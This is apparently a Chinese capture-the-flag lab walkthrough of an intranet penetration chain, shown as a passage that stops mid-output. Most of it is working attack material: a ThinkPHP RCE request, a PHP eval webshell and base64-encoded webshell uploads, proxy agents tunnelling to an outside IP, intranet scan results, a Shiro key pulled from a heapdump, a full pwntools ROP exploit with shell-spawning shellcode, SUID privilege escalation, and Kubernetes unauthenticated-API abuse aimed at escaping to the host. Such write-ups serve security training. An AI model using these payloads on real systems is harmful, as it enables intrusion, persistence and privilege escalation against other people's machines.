http://node.hackhub.get-shell.com:52484/?s=captchaAccept-Encoding: gzip, deflateAccept-Language: zh,zh-CN;q=0.9Content-Length: 80_method=__construct&amp;filter%5B%5D=system&amp;method=get&amp;server%5BREQUEST_METHOD%5D=cat /f1ag01_UdEv.txt<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://cdn.jsdelivr.net/gh/lingqing777/Cloud-Image-Hosting/6ff7982025fab6c124a8b3d030ba9f54.png"></p><p>写个马</p><pre class="line-numbers language-none"><code class="language-none">echo '&lt;?php eval($_POST[cmd]); ?&gt;' &gt; she.php<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><hr><h3 id="flag03"><a href="#flag03" class="headerlink" title="flag03"></a>flag03</h3><p>上代理</p><pre class="line-numbers language-none"><code class="language-none">./linux_x64_admin -c 39.101.67.119:7879 ./linux_x64_agent -l 7879 <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>扫内网</p><pre class="line-numbers language-none"><code class="language-none">fconfigeth0: flags=4163&lt;UP,BROADCAST,RUNNING,MULTICAST&gt;  mtu 1500        inet 172.28.23.17  netmask 255.255.0.0  broadcast 172.28.255.255<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-none"><code class="language-none">172.28.23.17:80 open172.28.23.17:8080 open172.28.23.17:22 open[*] WebTitle http://172.28.23.17       code:200 len:10887  title:""[*] WebTitle http://172.28.23.17:8080  code:200 len:1027   title:Login Form[+] PocScan http://172.28.23.17:8080 poc-yaml-thinkphp5023-method-rce poc1172.28.23.26:21 open172.28.23.33:8080 open172.28.23.17:8080 open172.28.23.26:80 open172.28.23.26:22 open172.28.23.33:22 open172.28.23.17:80 open172.28.23.17:22 open[*] WebTitle http://172.28.23.26       code:200 len:13693  title:新翔OA管理系统-OA管理平台联系电话：13849422648微信同号，QQ958756413[*] WebTitle http://172.28.23.17:8080  code:200 len:1027   title:Login Form[*] WebTitle http://172.28.23.17       code:200 len:10887  title:""[*] WebTitle http://172.28.23.33:8080  code:302 len:0      title:None 跳转url: http://172.28.23.33:8080/login;jsessionid=B8CDDF596CB271A2BD891E51AF727386[*] WebTitle http://172.28.23.33:8080/login;jsessionid=B8CDDF596CB271A2BD891E51AF727386 code:200 len:3860   title:智联科技 ERP 后台登陆[+] ftp 172.28.23.26:21:anonymous    [-&gt;]OASystem.zip[+] PocScan http://172.28.23.17:8080 poc-yaml-thinkphp5023-method-rce poc1[+] PocScan http://172.28.23.33:8080 poc-yaml-spring-actuator-heapdump-file [+] PocScan http://172.28.23.33:8080 poc-yaml-springboot-env-unauth spring2<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>见<code>Hospital</code>的步骤heapdump+拿shiro</p><pre class="line-numbers language-none"><code class="language-none">http://172.28.23.33:8080/actuator/heapdumpjava -jar .\JDumpSpider-1.1-SNAPSHOT-full.jar .\heapdumpCookieRememberMeManager(ShiroKey)-------------algMode = GCM（注意）, key = AZYyIgMYhG6/CzIJlvpR2g==, algName = AES<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://cdn.jsdelivr.net/gh/lingqing777/Cloud-Image-Hosting/cb379895cbec93dc4fca71dd6fcba10c.png"></p><pre class="line-numbers language-none"><code class="language-none">java -jar shiro_attack-4.7.0-SNAPSHOT-all.jar<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>勾选GCM</p><p><img src="https://cdn.jsdelivr.net/gh/lingqing777/Cloud-Image-Hosting/6af4cb4e20dcb22cc1ce68122452ac3c.png"></p><p>33（并没有什么作用）</p><pre class="line-numbers language-none"><code class="language-none">eth0: flags=4163&lt;UP,BROADCAST,RUNNING,MULTICAST&gt;  mtu 1500        inet 172.28.23.33  netmask 255.255.0.0  broadcast 172.28.255.255        inet6 fe80::216:3eff:fe05:2c1a  prefixlen 64  scopeid 0x20&lt;link&gt;        ether 00:16:3e:05:2c:1a  txqueuelen 1000  (Ethernet)        RX packets 233917  bytes 251273511 (251.2 MB)        RX errors 0  dropped 0  overruns 0  frame 0        TX packets 76271  bytes 264579870 (264.5 MB)        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0eth1: flags=4163&lt;UP,BROADCAST,RUNNING,MULTICAST&gt;  mtu 1500        inet 172.22.10.16  netmask 255.255.255.0  broadcast 172.22.10.255        inet6 fe80::216:3eff:fe05:2c1b  prefixlen 64  scopeid 0x20&lt;link&gt;        ether 00:16:3e:05:2c:1b  txqueuelen 1000  (Ethernet)        RX packets 5596  bytes 2725727 (2.7 MB)        RX errors 0  dropped 0  overruns 0  frame 0        TX packets 4769  bytes 2335376 (2.3 MB)        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0lo: flags=73&lt;UP,LOOPBACK,RUNNING&gt;  mtu 65536        inet 127.0.0.1  netmask 255.0.0.0        inet6 ::1  prefixlen 128  scopeid 0x10&lt;host&gt;        loop  txqueuelen 1000  (Local Loopback)        RX packets 8626  bytes 3298317 (3.2 MB)        RX errors 0  dropped 0  overruns 0  frame 0        TX packets 8626  bytes 3298317 (3.2 MB)        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0-----------------------------------------------------------------------<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>打通后需要用pwn提权</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">'./HashNote'</span><span class="token punctuation">)</span>context<span class="token punctuation">(</span>arch<span class="token operator">=</span>elf<span class="token punctuation">.</span>arch<span class="token punctuation">,</span> os<span class="token operator">=</span><span class="token string">'linux'</span><span class="token punctuation">,</span> log_level<span class="token operator">=</span><span class="token string">'debug'</span><span class="token punctuation">)</span><span class="token comment"># p = process('./HashNote')</span>p <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">'172.28.23.33'</span><span class="token punctuation">,</span> <span class="token number">59696</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">send_command</span><span class="token punctuation">(</span>command<span class="token punctuation">)</span><span class="token punctuation">:</span>    p<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">b': '</span><span class="token punctuation">,</span> <span class="token builtin">str</span><span class="token punctuation">(</span>command<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">add_entry</span><span class="token punctuation">(</span>key<span class="token punctuation">,</span> value<span class="token punctuation">)</span><span class="token punctuation">:</span>    send_command<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>    p<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">b'Key: '</span><span class="token punctuation">,</span> key<span class="token punctuation">)</span>    p<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">b'Data: '</span><span class="token punctuation">,</span> value<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">get_entry</span><span class="token punctuation">(</span>key<span class="token punctuation">)</span><span class="token punctuation">:</span>    send_command<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span>    p<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">b'Key: '</span><span class="token punctuation">,</span> key<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">update_entry</span><span class="token punctuation">(</span>key<span class="token punctuation">,</span> value<span class="token punctuation">)</span><span class="token punctuation">:</span>    send_command<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span>    p<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">b'Key: '</span><span class="token punctuation">,</span> key<span class="token punctuation">)</span>    p<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">b'Data: '</span><span class="token punctuation">,</span> value<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">set_username</span><span class="token punctuation">(</span>value<span class="token punctuation">)</span><span class="token punctuation">:</span>    send_command<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">)</span>    p<span class="token punctuation">.</span>sendafter<span class="token punctuation">(</span><span class="token string">b'New username: '</span><span class="token punctuation">,</span> value<span class="token punctuation">)</span><span class="token comment"># Authenticate</span>p<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">b'Username: '</span><span class="token punctuation">,</span> <span class="token string">b'123'</span><span class="token punctuation">)</span>p<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">b'Password: '</span><span class="token punctuation">,</span> <span class="token string">b'freep@ssw0rd:3'</span><span class="token punctuation">)</span><span class="token comment"># Add entries to setup the environment</span>add_entry<span class="token punctuation">(</span><span class="token string">b'aabP'</span><span class="token punctuation">,</span> <span class="token string">b'aaaaaaaa'</span><span class="token punctuation">)</span>add_entry<span class="token punctuation">(</span><span class="token string">b'aace'</span><span class="token punctuation">,</span> <span class="token string">b'C'</span> <span class="token operator">*</span> <span class="token number">0xc0</span><span class="token punctuation">)</span><span class="token comment"># Shellcode to spawn a shell</span>sc <span class="token operator">=</span> <span class="token punctuation">[</span>    <span class="token string">b'\x6a\x3b'</span><span class="token punctuation">,</span>                   <span class="token comment"># push   0x3b</span>    <span class="token string">b'\x58'</span><span class="token punctuation">,</span>                       <span class="token comment"># pop    rax</span>    <span class="token string">b'\x99'</span><span class="token punctuation">,</span>                       <span class="token comment"># cdq</span>    <span class="token string">b'\x48\xbb\x2f\x2f\x62\x69\x6e\x2f\x73\x68'</span><span class="token punctuation">,</span> <span class="token comment"># movabs rbx, 0x68732f6e69622f2f</span>    <span class="token string">b'\x53'</span><span class="token punctuation">,</span>                       <span class="token comment"># push   rbx</span>    <span class="token string">b'\x48\x89\xe7'</span><span class="token punctuation">,</span>               <span class="token comment"># mov    rdi, rsp</span>    <span class="token string">b'\x52'</span><span class="token punctuation">,</span>                       <span class="token comment"># push   rdx</span>    <span class="token string">b'\x57'</span><span class="token punctuation">,</span>                       <span class="token comment"># push   rdi</span>    <span class="token string">b'\x48\x89\xe6'</span><span class="token punctuation">,</span>               <span class="token comment"># mov    rsi, rsp</span>    <span class="token string">b'\x0f\x05'</span>                    <span class="token comment"># syscall</span><span class="token punctuation">]</span>shellcode <span class="token operator">=</span> <span class="token string">b''</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span>sc<span class="token punctuation">)</span>username_addr <span class="token operator">=</span> <span class="token number">0x5dc980</span>fake_obj_addr <span class="token operator">=</span> username_addr <span class="token operator">+</span> <span class="token number">0x10</span><span class="token keyword">def</span> <span class="token function">arbitrary_read</span><span class="token punctuation">(</span>addr<span class="token punctuation">)</span><span class="token punctuation">:</span>    payload <span class="token operator">=</span> p64<span class="token punctuation">(</span>fake_obj_addr<span class="token punctuation">)</span>    payload <span class="token operator">+=</span> p64<span class="token punctuation">(</span><span class="token number">0xdeadbeef</span><span class="token punctuation">)</span>    fake_obj <span class="token operator">=</span> p64<span class="token punctuation">(</span>fake_obj_addr <span class="token operator">+</span> <span class="token number">0x10</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">)</span>    fake_obj <span class="token operator">+=</span> <span class="token string">b'aahO'</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">0x10</span><span class="token punctuation">,</span> <span class="token string">b'\x00'</span><span class="token punctuation">)</span>    fake_obj <span class="token operator">+=</span> p64<span class="token punctuation">(</span>addr<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">b'aaaaaaaa'</span>    payload <span class="token operator">+=</span> fake_obj    payload <span class="token operator">+=</span> shellcode    payload <span class="token operator">=</span> payload<span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">128</span><span class="token punctuation">,</span> <span class="token string">b'\x00'</span><span class="token punctuation">)</span>    set_username<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>    get_entry<span class="token punctuation">(</span><span class="token string">b'aahO'</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">arbitrary_write</span><span class="token punctuation">(</span>addr<span class="token punctuation">,</span> data<span class="token punctuation">)</span><span class="token punctuation">:</span>    payload <span class="token operator">=</span> p64<span class="token punctuation">(</span>fake_obj_addr<span class="token punctuation">)</span>    payload <span class="token operator">+=</span> p64<span class="token punctuation">(</span><span class="token number">0xdeadbeef</span><span class="token punctuation">)</span>    fake_obj <span class="token operator">=</span> p64<span class="token punctuation">(</span>fake_obj_addr <span class="token operator">+</span> <span class="token number">0x10</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">)</span>    fake_obj <span class="token operator">+=</span> <span class="token string">b'aahO'</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">0x10</span><span class="token punctuation">,</span> <span class="token string">b'\x00'</span><span class="token punctuation">)</span>    fake_obj <span class="token operator">+=</span> p64<span class="token punctuation">(</span>addr<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>data<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">b'aaaaaaaa'</span>    payload <span class="token operator">+=</span> fake_obj    payload <span class="token operator">+=</span> shellcode    payload <span class="token operator">=</span> payload<span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">128</span><span class="token punctuation">,</span> <span class="token string">b'\x00'</span><span class="token punctuation">)</span>    set_username<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>    update_entry<span class="token punctuation">(</span><span class="token string">b'aahO'</span><span class="token punctuation">,</span> data<span class="token punctuation">)</span><span class="token comment"># Leak the stack address</span>environ <span class="token operator">=</span> <span class="token number">0x5e4c38</span> arbitrary_read<span class="token punctuation">(</span>environ<span class="token punctuation">)</span>stack_addr <span class="token operator">=</span> u64<span class="token punctuation">(</span><span class="token punctuation">(</span>p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">b'\x7f'</span><span class="token punctuation">,</span> drop<span class="token operator">=</span><span class="token boolean">False</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">6</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span> <span class="token string">b'\0'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>success<span class="token punctuation">(</span><span class="token string">'stack_addr'</span><span class="token punctuation">,</span> stack_addr<span class="token punctuation">)</span><span class="token comment"># ROP gadgets</span>rdi <span class="token operator">=</span> <span class="token number">0x0000000000405e7c</span>rsi <span class="token operator">=</span> <span class="token number">0x000000000040974f</span>rax <span class="token operator">=</span> <span class="token number">0x00000000004206ba</span>rdx_rbx <span class="token operator">=</span> <span class="token number">0x000000000053514b</span>shr_eax_2 <span class="token operator">=</span> <span class="token number">0x0000000000523f2e</span>syscall_ret <span class="token operator">=</span> <span class="token number">0x00000000004d9776</span><span class="token comment"># ROP payload to map memory and jump to shellcode</span>payload <span class="token operator">=</span> p64<span class="token punctuation">(</span>rdi<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>username_addr <span class="token operator">&amp;</span> <span class="token operator">~</span><span class="token number">0xfff</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>rsi<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0x1000</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>rdx_rbx<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">7</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>rax<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0xa</span> <span class="token operator">&lt;&lt;</span> <span class="token number">2</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>shr_eax_2<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>syscall_ret<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>username_addr <span class="token operator">+</span> <span class="token number">0x48</span><span class="token punctuation">)</span>arbitrary_write<span class="token punctuation">(</span>stack_addr <span class="token operator">-</span> <span class="token number">0x210</span><span class="token punctuation">,</span> payload<span class="token punctuation">)</span>p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">b'uname -ar'</span><span class="token punctuation">)</span>p<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>提权后能拿到本机的flag</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">cat</span> /root/flag_RaYz1/f* <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><hr><h3 id="flag02"><a href="#flag02" class="headerlink" title="flag02"></a>flag02</h3><p>上面知道26有一个新翔OA管理系统，有漏洞直接复现</p><p><a href="https://blog.csdn.net/m0_62501867/article/details/142388022">https://blog.csdn.net/m0_62501867/article/details/142388022</a></p><p><img src="https://cdn.jsdelivr.net/gh/lingqing777/Cloud-Image-Hosting/1e97820801f863fa8e22978a07aab7fd.png"></p><p>用蚁剑的插件绕过</p><h5 id="LD-PRELOAD"><a href="#LD-PRELOAD" class="headerlink" title="LD_PRELOAD"></a>LD_PRELOAD</h5><p><img src="https://cdn.jsdelivr.net/gh/lingqing777/Cloud-Image-Hosting/9959d5616384ab489c18e09ed4bc9e38.png"></p><pre class="line-numbers language-none"><code class="language-none">imgbase64=data:image/php;base64,PD9waHAgQGV2YWwoJF9QT1NUWycxJ10pOw==http://172.28.23.26/uploadbase64.php{"src":"upload/2025-09-11-68c28ca682098.php"}\http://172.28.23.26/upload/2025-09-11-68c28ca682098.php<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-none"><code class="language-none">默认生成.antproxy.php，已修改为qq.php/var/www/html/OAsystem/upload/qq.php/tmp/.69433ant_x64.so<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>新建一个 get 型木马 <code>shell.php</code>（post 型在当前环境无法利用成功）：</p><pre class="line-numbers language-none"><code class="language-none">imgbase64=data:image/php;base64,PD9waHAgQGV2YWwoJF9HRVRbJzEnXSk7{"src":"upload/2025-09-11-68c2994da6a75.php"}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>修改 <code>qq.php</code>，使其指向 <code>shell.php</code>：</p><pre class="line-numbers language-none"><code class="language-none"># 将 $url = "/2025-09-11-68c28ca682098.php"; 修改为"upload/2025-09-11-68c2994da6a75.php"(因为用插件时会改变路径，不加upload的话会找不到【不在一个路径下】)<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://cdn.jsdelivr.net/gh/lingqing777/Cloud-Image-Hosting/216efd3403811a766caa9013caf47b05.png"></p><p><img src="https://cdn.jsdelivr.net/gh/lingqing777/Cloud-Image-Hosting/f4b5f89fedbe013251aba75e0bdd80cd.png"></p><p>or</p><h5 id="PHP7-Backtrace-UAF"><a href="#PHP7-Backtrace-UAF" class="headerlink" title="PHP7 Backtrace UAF"></a>PHP7 Backtrace UAF</h5><p>可以直接返回一个 shell，但这个方式执行命令不是特别稳定。</p><p>提权</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token punctuation">(</span>www-data:/var/www/html/OAsystem/upload<span class="token punctuation">)</span> $ <span class="token function">find</span> / <span class="token parameter variable">-user</span> root <span class="token parameter variable">-perm</span> <span class="token parameter variable">-4000</span> <span class="token parameter variable">-print</span> <span class="token operator"><span class="token file-descriptor important">2</span>&gt;</span>/dev/null/bin/fusermount/bin/ping6/bin/mount/bin/su/bin/ping/bin/umount/usr/bin/chfn/usr/bin/newgrp/usr/bin/gpasswd/usr/bin/staprun/usr/bin/base32/usr/bin/passwd/usr/bin/chsh/usr/bin/sudo/usr/lib/dbus-1.0/dbus-daemon-launch-helper/usr/lib/openssh/ssh-keysign/usr/lib/eject/dmcrypt-get-device/usr/lib/s-nail/s-nail-privsep<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>用<code>base32</code></p><pre class="line-numbers language-none"><code class="language-none">/usr/bin/base32 /flag02.txtMZWGCZZQGI5CAZTMMFTXWNJWMQZTONZTGQWTKZRXGMWTINBXMYWWEMLBGUWWCOBTMY2DKNJUHFRDEOD5BI======flag02: flag{56d37734-5f73-447f-b1a5-a83f45549b28}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><hr><h3 id="flag04"><a href="#flag04" class="headerlink" title="flag04"></a>flag04</h3><p>26</p><pre class="line-numbers language-none"><code class="language-none">eth0      Link encap:Ethernet  HWaddr 00:16:3e:05:2c:24            inet addr:172.28.23.26  Bcast:172.28.255.255  Mask:255.255.0.0          inet6 addr: fe80::216:3eff:fe05:2c24/64 Scope:Link          UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1          RX packets:210198 errors:0 dropped:0 overruns:0 frame:0          TX packets:64384 errors:0 dropped:0 overruns:0 carrier:0          collisions:0 txqueuelen:1000           RX bytes:232189119 (232.1 MB)  TX bytes:55952974 (55.9 MB)eth1      Link encap:Ethernet  HWaddr 00:16:3e:05:2b:f2            inet addr:172.22.14.6  Bcast:172.22.255.255  Mask:255.255.0.0          inet6 addr: fe80::216:3eff:fe05:2bf2/64 Scope:Link          UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1          RX packets:84417 errors:0 dropped:0 overruns:0 frame:0          TX packets:83290 errors:0 dropped:0 overruns:0 carrier:0          collisions:0 txqueuelen:1000           RX bytes:11894620 (11.8 MB)  TX bytes:16336530 (16.3 MB)lo        Link encap:Local Loopback            inet addr:127.0.0.1  Mask:255.0.0.0          inet6 addr: ::1/128 Scope:Host          UP LOOPBACK RUNNING  MTU:65536  Metric:1          RX packets:14119 errors:0 dropped:0 overruns:0 frame:0          TX packets:14119 errors:0 dropped:0 overruns:0 carrier:0          collisions:0 txqueuelen:1           RX bytes:9210359 (9.2 MB)  TX bytes:9210359 (9.2 MB)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-none"><code class="language-none">172.22.14.46:80 open172.22.14.37:22 open172.22.14.46:22 open172.22.14.6:80 open172.22.14.6:22 open172.22.14.37:2379 open172.22.14.37:10250 open172.22.14.6:21 open[*] WebTitle http://172.22.14.46       code:200 len:785    title:Harbor[+] InfoScan http://172.22.14.46       [Harbor] [*] WebTitle http://172.22.14.6        code:200 len:13693  title:新翔OA管理系统-OA管理平台联系电话：13849422648微信同号，QQ958756413[*] WebTitle https://172.22.14.37:10250 code:404 len:19     title:None[+] ftp 172.22.14.6:21:anonymous    [-&gt;]OASystem.zip[+] PocScan http://172.22.14.46/swagger.json poc-yaml-swagger-ui-unauth [{path swagger.json}]<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-none"><code class="language-none">在stowawy上listenuse 0listen144440在目标机上./linux_x64_agent -c 172.28.23.17:44440即可然后backuse 1<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>看一下网</p><pre class="line-numbers language-none"><code class="language-none">172.22.14.37:22 open172.22.14.37:2380 open172.22.14.37:2379 open172.22.14.37:6443 open172.22.14.37:10252 open172.22.14.37:10250 open172.22.14.37:10251 open172.22.14.37:10256 open[*] WebTitle http://172.22.14.37:10251 code:404 len:19     title:None[*] WebTitle http://172.22.14.37:10252 code:404 len:19     title:None[*] WebTitle https://172.22.14.37:6443 code:200 len:4671   title:None[*] WebTitle http://172.22.14.37:10256 code:404 len:19     title:None[*] WebTitle https://172.22.14.37:10250 code:404 len:19     title:None[+] PocScan https://172.22.14.37:6443 poc-yaml-go-pprof-leak [+] PocScan https://172.22.14.37:6443 poc-yaml-kubernetes-unauth <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><a href="https://l0n9w4y.cc/posts/33009/">https://l0n9w4y.cc/posts/33009/</a></p><p>存在 Kubernetes API server 未授权：</p><pre class="line-numbers language-none"><code class="language-none">https://172.22.14.37:6443<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://cdn.jsdelivr.net/gh/lingqing777/Cloud-Image-Hosting/2f5abc2300016ca923b9b179447bc26a.png"></p><p><a href="https://kubernetes.io/zh-cn/docs/tasks/tools/install-kubectl-linux/">在 Linux 系统中安装并设置 kubectl | Kubernetes</a></p><blockquote><p>ubectl 是go binary，而go binary 自己实现了底层，所以proxychains对他不起作用</p><p>具体的打法就是写一个evil-deployment.yaml，然后我们把宿主机/目录挂载到容器内部/mnt目录，接着写公钥就成功逃逸</p></blockquote><pre class="line-numbers language-none"><code class="language-none">PS E:\ctf\web\tools&gt; kubectl -s https://172.22.14.37:6443/ get pods（查看 pod（用户名密码输入任意内容即可）：）Please enter Username: xianxinshhPlease enter Password: Unable to connect to the server: tls: failed to verify certificate: x509: certificate signed by unknown authority列出podPS E:\ctf\web\tools&gt; kubectl --insecure-skip-tls-verify -s https://172.22.14.37:6443/ get podsPlease enter Username: xianxinshhPlease enter Password: NAME                                READY   STATUS    RESTARTS   AGEnginx-deployment                    1/1     Running   0          3h31mnginx-deployment-864f8bfd6f-st7ch   1/1     Running   0          137m查看 pod 资源：PS E:\ctf\web\tools&gt; kubectl --insecure-skip-tls-verify -s https://172.22.14.37:6443/ describe pod nginx-deployment-864f8bfd6f-st7chPlease enter Username: xianxinshhPlease enter Password: Name:             nginx-deployment-864f8bfd6f-st7chNamespace:        defaultPriority:         0Service Account:  defaultNode:             ubuntu-k8s/172.22.14.37Start Time:       Thu, 11 Sep 2025 20:56:22 +0800Labels:           app=nginx                  pod-template-hash=864f8bfd6fAnnotations:      &lt;none&gt;Status:           RunningIP:               10.244.0.16IPs:  IP:           10.244.0.16Controlled By:  ReplicaSet/nginx-deployment-864f8bfd6fContainers:  nginx:    Container ID:   docker://8c6689484fece58fe39b9a82f6fa7aecb7fdfb0cd964554e07ae124fd37b249b    Image:          nginx:1.8（***********||||***********）    Image ID:       docker-pullable://nginx@sha256:c97ee70c4048fe79765f7c2ec0931957c2898f47400128f4f3640d0ae5d60d10    Port:           &lt;none&gt;    Host Port:      &lt;none&gt;    State:          Running      Started:      Thu, 11 Sep 2025 20:56:23 +0800    Ready:          True    Restart Count:  0    Environment:    &lt;none&gt;    Mounts:      /mnt from test-volume (rw)      /var/run/secrets/kubernetes.io/serviceaccount from default-token-6d2pl (ro)Conditions:  Type              Status  Initialized       True  Ready             True  ContainersReady   True  PodScheduled      TrueVolumes:  test-volume:    Type:          HostPath (bare host directory volume)    Path:          /    HostPathType:  default-token-6d2pl:    Type:        Secret (a volume populated by a Secret)    SecretName:  default-token-6d2pl    Optional:    falseQoS Class:       BestEffortNode-Selectors:  &lt;none&gt;Tolerations:     node.kubernetes.io/not-ready:NoExecute op=Exists for 300s                 node.kubernetes.io/unreachable:NoExecute op=Exists for 300sEvents:          &lt;none&gt;<span aria-hidden="true" 